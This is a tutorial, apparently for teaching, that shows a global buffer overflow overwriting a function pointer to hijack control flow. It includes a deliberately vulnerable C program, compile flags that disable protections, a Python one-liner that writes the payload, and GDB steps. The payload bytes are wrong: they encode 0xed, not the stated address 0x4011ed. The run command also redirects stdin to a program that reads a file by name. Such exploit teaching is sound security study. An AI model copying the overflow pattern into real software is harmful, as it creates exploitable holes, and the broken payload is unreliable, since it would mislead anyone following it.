
### 🧪 Objective:

Show how a **buffer overflow** can overwrite a **function pointer** stored in the global BSS segment, hijacking the control flow.

---

### 📝 1. Source Code (`bss_overflow.c`)

```c
#include <stdio.h>
#include <string.h>

// Global buffer and function pointer (both uninitialized — in BSS)
char buffer[32];
void (*func_ptr)();

void safe_function() {
    printf("✅ Safe function executed.\n");
}

void hacked_function() {
    printf("🚨 Hacked! Buffer overflow in BSS hijacked control flow.\n");
}

int main() {
    func_ptr = safe_function;

    // Print addresses to assist crafting the exploit
    printf("buffer        @ %p\n", buffer);
    printf("func_ptr      @ %p\n", &func_ptr);
    printf("safe_function @ %p\n", safe_function);
    printf("hacked_function @ %p\n", hacked_function);

    FILE *f = fopen("input.bin", "rb");
    if (!f) {
        perror("input.bin");
        return 1;
    }

    size_t n = fread(buffer, 1, 40, f);  // overflow happens here
    fclose(f);

    printf("Read %zu bytes\n", n);
    printf("Calling func_ptr...\n");

    func_ptr();  // may be hijacked

    return 0;
}
```

---

### ⚙️ 2. Compile with Insecure Flags

```bash
gcc -fno-stack-protector -z execstack -no-pie -o bss_overflow bss_overflow.c
```

> These flags ensure:
>
> * No stack canary (`-fno-stack-protector`)
> * Executable memory for injected shellcode (not needed here but realistic)
> * No position-independent execution (`-no-pie`) — so addresses are predictable

---

### 🧠 3. Understand the Memory Layout

Run the program once to get addresses:

```bash
./bss_overflow
```

Example output:

```
buffer        @ 0x404080
func_ptr      @ 0x4040a0
safe_function @ 0x4011d6
hacked_function @ 0x4011ed
```

These addresses are fixed with ASLR disabled.

---

### 🛠️ 4. Create Exploit Payload

We need to:

* Fill `buffer` (32 bytes)
* Overwrite `func_ptr` (8 more bytes on 64-bit systems)
* Use address of `hacked_function`, e.g., `0x4011ed`

Convert to little-endian:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\xed\x00\x00\x00\x00\x00\x00\x00")' > input.bin

```

---

### 🚀 5. Run Exploit

```bash
./bss_overflow < input.bin
```

Expected output:

```
Read 40 bytes
Calling func_ptr...
🚨 Hacked! Buffer overflow in BSS hijacked control flow.
```

---

### 🔍 6. Debugging with GDB (Optional but Educational)

```bash
gdb ./bss_overflow
(gdb) break main
(gdb) run < input.bin
(gdb) x/8xb 0x404080     # View buffer
(gdb) x/gx 0x4040a0      # View func_ptr
```

